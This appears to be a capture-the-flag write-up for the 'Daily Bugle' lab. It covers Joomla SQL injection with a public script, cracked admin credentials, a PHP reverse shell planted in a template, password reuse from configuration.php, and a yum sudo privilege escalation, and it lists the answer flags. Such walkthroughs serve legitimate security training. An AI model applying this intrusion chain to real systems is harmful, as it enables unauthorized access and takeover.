# Daily Bugle(Hard)

### Enum
```bash
rustscan -a {ipaddress}

gobuster -u http://{ipadress} -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-2.3-big.txt
```

## Flags

Hint suggests don't use SqlMap
https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py

```bash
python joomblah.py http://{ipaddress}

Dumps Super User jonah and Hashed password(Blowfish indicated by $2$)
Upload hash to hashes.net or crack locally
```
### Misc Thoughts
```
Tried to upload a ELF executable meterpreter shell file to improve the stability, however the stageless payload did not properly handshake.

```
### User Flag
Loginto http://{ipaddress}/administrator with the found creds
jonah:spiderman123

Upload a php payload into the index.php template file. I used the Ivan Sincek php payload on port `9001 `

Start a reverse shell
`nc -lvnp 9001`

Go to http://{ipaddress}/index.php (home page for the daily bugle)
You should now have access through `apache ` user.
Look around the local dir. `configuration.php` - Interesting bit under root?
Following typical CTF/THM rooms, try to cat the user flag
```bash
ls /home
cat /home/jjameson/user.txt

No Access though

```bash
ssh jjameson@{ipaddress}
Password: <Root_Pass found in configuration.php>

# cat user.txt - 27a260fe3cba712cfdedb1c86d80442e
```

### Root Shell
```bash
jjameson$ - Sudo -L 

# We see that Yum has no pass root sudo access!
# Check out GTFO Bins https://gtfobins.github.io/gtfobins/yum/

Used Technique (B) to spawn interactive shell by loading custom plugin
#Copy paste to my ssh session and waited for the execution to complete...

sh#

cat /root/root.txt - eec3d53292b1821868266858d7fa6f79
```